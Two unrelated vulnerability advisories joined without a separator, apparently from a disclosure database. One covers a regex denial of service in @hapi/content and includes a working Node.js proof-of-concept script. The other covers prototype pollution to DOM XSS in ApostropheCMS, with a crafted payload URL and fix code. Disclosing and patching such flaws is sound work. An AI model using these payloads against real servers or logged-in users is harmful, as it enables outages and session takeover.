### Summary

`Content.disposition()` takes quadratic time when a `Content-Disposition` parameter contains a long token without `=`. One unauthenticated multipart request can block the Node.js event loop for several minutes.

### Details

`Content.disposition()` reads the parameters with a global regular expression in `String.prototype.replace()`:

```js
/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;'"\s]+\'[\w-]*\'[^;\s]+)|(?:\"([^"]*)\")|([^;\s]*))/g
```

The parameter name part `([^\=\*\s]+)` has no anchor. When a run of name characters has no `=` after it, the match attempt reads the full run and fails. The global scan then starts again at the next character and reads the remaining run again. The total time is proportional to the square of the run length.

`@hapi/pez` calls `Content.disposition()` on the header of every part in a `multipart/form-data` body. In hapi, this occurs on each route with `payload.multipart` enabled, before the route handler and before any validation. The only size limit is the route `payload.maxBytes`, which is 1 MB by default.

The fix adds an alternative that matches the full run of name characters when no `=` follows it. The scan then continues after the run, and the callback ignores this match. A match attempt that starts later in the same run always fails in the same way, so the parse result does not change. The parse time is now linear.

```js
/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;'"\s]+\'[\w-]*\'[^;\s]+)|(?:\"([^"]*)\")|([^;\s]*))|[^\=\*\s]+/g
```

Every release from `3.0.6` (published as `content`) up to and including `@hapi/content` `6.0.2` is affected.

Workarounds: none that removes the risk, upgrade required. To reduce the delay for each request until you upgrade, set a low `payload.maxBytes` on routes that accept multipart payloads. A token of 64 KB still blocks the process for more than 1 second.

### Proof of concept

Install `@hapi/hapi` with `@hapi/content` `6.0.2`, then run:

```js
const Hapi = require('@hapi/hapi');
const Net = require('net');

const attack = (port, n) => new Promise((resolve) => {

    const body = `--x\r\nContent-Disposition: form-data; name="f"; ${'a'.repeat(n)}\r\n\r\nv\r\n--x--\r\n`;
    const req = `POST /upload HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary=x\r\nContent-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`;
    const start = process.hrtime.bigint();
    let res = '';
    const socket = Net.connect(port, '127.0.0.1', () => socket.write(req));
    socket.on('data', (chunk) => res += chunk);
    socket.on('close', () => resolve(`${n} byte token  HTTP ${res.split(' ')[1]}  ${(Number(process.hrtime.bigint() - start) / 1e9).toFixed(3)} s`));
});

(async () => {

    const server = Hapi.server({ host: '127.0.0.1', port: 7001 });
    server.route({
        method: 'POST',
        path: '/upload',
        options: {
            auth: false,
            payload: { multipart: { output: 'data' }, parse: true }
        },
        handler: () => ({ ok: true })
    });

    await server.start();
    for (const n of [32000, 64000, 128000]) {
        console.log(await attack(7001, n));
    }

    await server.stop();
})();
```

With `@hapi/content` `6.0.2`, the time increases by approximately four for each doubling of the token. During each request, the server does not answer other clients:

```text
32000 byte token  HTTP 200  0.424 s
64000 byte token  HTTP 200  1.670 s
128000 byte token  HTTP 200  7.173 s
```

The reporter measured 542 seconds for a token of 1,024,000 bytes, which is near the default `payload.maxBytes`.

With `@hapi/content` `6.0.3`:

```text
32000 byte token  HTTP 200  0.011 s
64000 byte token  HTTP 200  0.003 s
128000 byte token  HTTP 200  0.004 s
1024000 byte token  HTTP 200  0.013 s
```

### Impact

This is a denial of service through slow regular expression processing. It affects every hapi server with a route that accepts multipart payloads, and every application that gives untrusted headers to `Content.disposition()`. An unauthenticated attacker sends one upload request of normal size, and the Node.js process stops answering all clients for seconds to minutes. A small number of these requests keeps the service unavailable.

## Summary

The client-side helper `apos.http.parseQuery()` in ApostropheCMS builds a nested object
from a URL query string without sanitizing the keys `__proto__`, `constructor`, or
`prototype`. Parsing an attacker-controlled query string therefore writes arbitrary
properties onto `Object.prototype` (client-side prototype pollution).

ApostropheCMS's admin UI calls this parser with `window.location.search` on **every
authenticated page load** (the admin context bar's `data()` initializer). Because the admin
UI is built on Vue, a polluted, enumerable property on `Object.prototype` is then picked up
by Vue's standard element-mount routine and written to the DOM as an element property,
turning the prototype pollution into DOM-based XSS in the victim's authenticated session.
The escalation gadget is a well-known, general Vue behavior; the novel,
reportable defect is the unsanitized `parseQuery` source together with the authenticated
trigger, both of which are ApostropheCMS code.

Any user who can get **any logged-in user (from the lowest-privileged `guest` role up to the highest-privileged `admin` role)** to
open a crafted URL can execute arbitrary JavaScript in that user's session.

This is **distinct from CVE-2026-53609** (server-side prototype pollution via
`apos.util.set()` / `$pullAll`, fixed in 4.31.0): different side (client vs server),
different code path, and the vulnerable code here is present in the current release.

## Package

- **Ecosystem:** npm
- **Package:** `apostrophe`
- **Affected versions:** all **4.x** releases, **4.0.0 through 4.32.2** (current `latest`).
  Verified by inspecting the published npm tarballs: `apostrophe@4.0.0` already contains the
  vulnerable descent (`parentKey = 'root'`) with no `__proto__`/`constructor`/`prototype`
  filtering, and `apostrophe@4.32.2` is unchanged in this respect. The vulnerable
  `parseQuery()` logic was introduced in commit `0255086bf` (2020-11-12), well before the 4.0
  version, so **ApostropheCMS 3.x is also affected** (the same code ships in 3.x at the older
  build path `modules/@apostrophecms/util/ui/public/2-http.js`).
- **Patched versions:** none at time of writing.

## Details

The issue has three parts. Parts 1 and 2 are ApostropheCMS code and constitute the
reportable vulnerability. Part 3 is the escalation gadget, which is standard Vue behavior
and is included for completeness.

### 1. The pollution primitive: source (ApostropheCMS)

`modules/@apostrophecms/util/ui/src/http.js`, function `apos.http.parseQuery()`
(line ~301) and its inner `patch()` (lines ~317–354):

```js
function patch(key, value) {
  let match;
  let parentKey = 'root';
  let context = data;                    // data = {}  (ordinary object)
  key = decodeURIComponent(key);
  const path = key.split('[');
  path.forEach(function(subKey) {
    if (subKey === ']') {
      /* array handling */
    } else if (subKey.match(/^\d+]/)) {
      /* numeric index handling */
    } else {
      match = subKey.replace(']', '');
      if (!context[parentKey]) {         // (A) truthy check, not an own-property check
        context[parentKey] = {};
      }
      context = context[parentKey];      // (B) descends into whatever this resolves to
      parentKey = match;
    }
  });
  value = (value === null) ? value : decodeURIComponent(value);
  if (Array.isArray(context[parentKey])) {
    context[parentKey].push(value);
  } else if (context[parentKey] !== undefined) {
    context[parentKey] = [ context[parentKey], value ];
  } else {
    context[parentKey] = value;          // (C) assignment onto the resolved object
  }
}
```

No `__proto__`, `constructor`, or `prototype` key is rejected. Walking the input
`__proto__[x]=v`:

1. Segment `__proto__`: at **(A)**, `context['__proto__']` resolves to the object's
   inherited prototype (truthy), so the `{}` initializer is skipped; at **(B)**, `context`
   becomes `Object.prototype`.
2. Segment `x`: at **(C)**, `Object.prototype['x'] = v`.

The truthy guard at **(A)** (rather than an own-property check) is what allows the descent
into the inherited prototype. Because the assignment at **(C)** is an ordinary property
write, the resulting `Object.prototype` property is **enumerable**,which matters for the
gadget (3).

### 2. The trigger: reached on every authenticated page load (ApostropheCMS)

`modules/@apostrophecms/admin-bar/ui/apos/components/TheAposContextBar.vue`. The component's
`data()` initializer (line ~64) runs when the admin context bar mounts (i.e. on every
authenticated page load), and passes the raw query string straight into the vulnerable
parser:

```js
data() {
  const query = apos.http.parseQuery(location.search);   // <- attacker-controlled -> (1) pollution, on mount
  const draftMode = query.aposMode || 'published';
  // ...
}
```

The same component's `refresh()` method (line ~606) passes `window.location.search` into
`parseQuery()` again on admin-bar refresh events, and folds it into `doc._url`
(re-parsed inside `apos.http.remote()`), providing additional trigger points.

The admin context bar mounts only when a session is present and the admin bundle loads, so
none of this executes for anonymous visitors, which is why the pollution is observed **only
when logged in**. All of this is core ApostropheCMS code (`node_modules/apostrophe/...`);
it is not introduced by any project or starter kit content.

### 3. The escalation gadget: Vue element mount (framework behavior; known, not novel)

The demonstrated payload pollutes the property `innerHTML`
(`__proto__[innerHTML]=<img/src/onerror=alert(1)>`). The sink that consumes it is **Vue's
standard element-mount path**, not ApostropheCMS code. Confirmed in the bundled framework
(`vue` / `@vue/runtime-core` / `@vue/runtime-dom` all **3.5.42**):

`@vue/runtime-core` `mountElement`, prop enumeration (line ~5741):

```js
if (props) {
  for (const key in props) {                              // for...in walks the prototype chain
    if (key !== "value" && !shared.isReservedProp(key)) { // isReservedProp does NOT list innerHTML
      hostPatchProp(el, key, null, props[key], ...);      // props["innerHTML"] → inherited polluted value
    }
  }
```

`@vue/runtime-dom` `patchDOMProp` (line ~583), reached via `hostPatchProp`:

```js
function patchDOMProp(el, key, value, ...) {
  if (key === "innerHTML" || key === "textContent") {
    if (value != null) {
      el[key] = key === "innerHTML" ? unsafeToTrustedHTML(value) : value;  // el.innerHTML = payload
    }
    return;
  }
```

Mechanism: whenever Vue mounts an element that has a non-null `props` object without its own
`innerHTML` (routine during the admin render), `for (const key in props)` enumerates the
inherited, enumerable `innerHTML` from `Object.prototype`; it passes the `"value"` and
`isReservedProp` filters; `props["innerHTML"]` resolves to the attacker's payload; and
`patchDOMProp` writes it to `el.innerHTML`. `unsafeToTrustedHTML` is Vue's Trusted-Types
wrapper, not a sanitizer, a passthrough unless Trusted Types is enforced (not the default).

This gadget is a well-documented, essentially universal client-side-PP > XSS escalation in Vue applications.
It is **not claimed as a novel finding** and is **not ApostropheCMS's to fix**, it cannot
be removed without changing Vue. Its relevance here is that it makes the (1) pollution
reliably exploitable in any ApostropheCMS admin session.

## Proof of Concept

Prerequisite: a running ApostropheCMS instance and any authenticated session (a `guest`
account suffices). The tester/victim must be logged in.

**A. Prototype pollution (console-verifiable):**

1. Log in as any user.
2. Navigate to: `https://TARGET/?__proto__[prop]=polluted`
3. In the browser console: `Object.prototype.prop` > returns `"polluted"`.

**B. DOM-based XSS:**

1. Log in as any user.
2. Navigate to:
   `https://TARGET/?__proto__[innerHTML]=%3Cimg/src/onerror%3dalert(1)%3E`
3. `alert(1)` executes in the victim's authenticated origin.

To capture the sink stack for evidence: DevTools > Sources > open the admin bundle >
pretty-print > search `unsafeToTrustedHTML` (or `=== "innerHTML"`) > line breakpoint in the
`patchDOMProp` innerHTML branch > reload the logged-in payload URL > inspect `value` and
walk the call stack up through `hostPatchProp` to `mountElement`'s `for…in`.

Both A and B were reproduced against ApostropheCMS 4.32.2 (Vue 3.5.42) in Chrome, Firefox, and Edge browsers.

## Impact

Any party who can coerce an authenticated ApostropheCMS user to open a crafted URL can
execute arbitrary JavaScript in that user's session. Because the escalation gadget is a
guaranteed-present Vue behavior, this is a reliable exploit, not a theoretical primitive.
Consequences scale with the victim's role:

- **Any authenticated victim:** actions and data reads available to that account; theft of
  the session cookie / CSRF token from the authenticated context.
- **Editor/admin victim:** the injected script can invoke the authenticated management REST
  APIs as the victim, creating or modifying documents and user accounts, changing
  configuration and possibly leading to account takeover and potential full compromise of the CMS
  instance.

Prototype pollution can additionally affect unrelated code paths that read inherited
properties, so other gadgets beyond the demonstrated Vue `innerHTML` sink may exist.

## Remediation

The fix belongs in ApostropheCMS, at the source (1). The gadget (3) is framework behavior
and cannot be relied upon to change, so sanitizing `parseQuery` is the correct fix.

**Primary fix: reject prototype-affecting keys in `parseQuery`/`patch()`**:

```js
apos.http.parseQuery = function(query) {
  query = query.replace(/^\?/, '');
  const data = {};
  const DANGEROUS = new Set([ '__proto__', 'constructor', 'prototype' ]);
  query.split('&').forEach(function(pair) {
    // ... unchanged ...
  });
  return data.root || {};

  function patch(key, value) {
    let match;
    let parentKey = 'root';
    let context = data;
    key = decodeURIComponent(key);
    const path = key.split('[');
    let dangerous = false;
    path.forEach(function(subKey) {
      const cleanKey = subKey.replace(']', '');
      if (DANGEROUS.has(cleanKey)) {   // refuse to traverse into prototype-affecting keys
        dangerous = true;
        return;
      }
      // ... existing subKey handling ...
    });
    if (dangerous) {
      return;                          // discard this parameter entirely
    }
    // ... existing assignment ...
  }
};
```

**Defense in depth:**
- Replace the truthy guard at **(A)** with an own-property check:
  `if (!Object.prototype.hasOwnProperty.call(context, parentKey))`, so a key can never
  descend into an inherited prototype.
- Build `data` and any created containers with `Object.create(null)` so intermediate objects
  have no prototype chain to reach.

**Interim mitigation for operators:** restrict who holds authenticated accounts, and be
aware that opening untrusted links while logged in can trigger this. There is no server-side
configuration toggle that disables the vulnerable client behavior.

